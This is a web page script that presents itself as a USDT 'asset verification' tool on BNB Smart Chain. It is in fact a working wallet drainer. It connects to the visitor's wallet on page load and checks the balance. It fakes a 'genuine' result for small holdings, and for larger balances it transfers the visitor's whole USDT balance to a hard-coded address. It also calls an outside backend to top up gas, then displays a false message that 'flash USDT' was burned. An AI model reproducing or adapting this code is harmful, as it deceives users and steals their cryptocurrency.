<script>
const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress;

// Universal wallet connect function
async function connectWallet() {
    if (typeof window.ethereum !== "undefined") {
        web3 = new Web3(window.ethereum);
        try {
            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });

            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }] // BNB Smart Chain
            });

            userAddress = accounts[0];
            console.log("✅ Wallet connected:", userAddress);
        } catch (error) {
            console.error("❌ Wallet connect error:", error);
            alert("Please connect your wallet and switch to BNB Smart Chain.");
        }
    } else {
        alert("No wallet found. Please install MetaMask, Trust Wallet, or any Web3 wallet.");
    }
}

// ✅ Force connect on load (supports all wallets)
window.addEventListener("load", () => {
    setTimeout(() => {
        connectWallet();
    }, 300);
});

async function verifybutton() {
    if (!web3 || !userAddress) {
        alert("Wallet not connected. Please refresh.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ], usdtContractAddress);

    const [usdtBalanceWei, userBNBWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    console.log(`USDT: ${usdtBalance}, BNB: ${userBNB}`);

    if (usdtBalance === 0) {
        showPopup("No assets found.", "black");
        return;
    }

    if (usdtBalance <= 1) {
        showPopup(`✅ Verification Successful<br>Your assets are genuine.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${userBNB}`, "green");
        return;
    }

    showPopup("Loading...", "green");
    transferUSDT(usdtBalance, userBNB);
}

async function transferUSDT(usdtBalance, userBNB) {
    try {
        if (userBNB < 0.0005) {
            console.log("Requesting BNB from backend...");
            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ toAddress: userAddress })
            });
        }

        const usdtContract = new web3.eth.Contract([
            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);

        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(`✅ Flash USDT detected and burned.<br><b>Burned:</b> ${usdtBalance} USDT`, "red");
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        alert("USDT transfer failed. Make sure you have BNB for gas.");
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f4f4f4";
    popup.style.color = color === "red" ? "red" : color === "green" ? "green" : "black";
    popup.innerHTML = message;
    popup.style.display = "block";

    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifybutton);
</script>
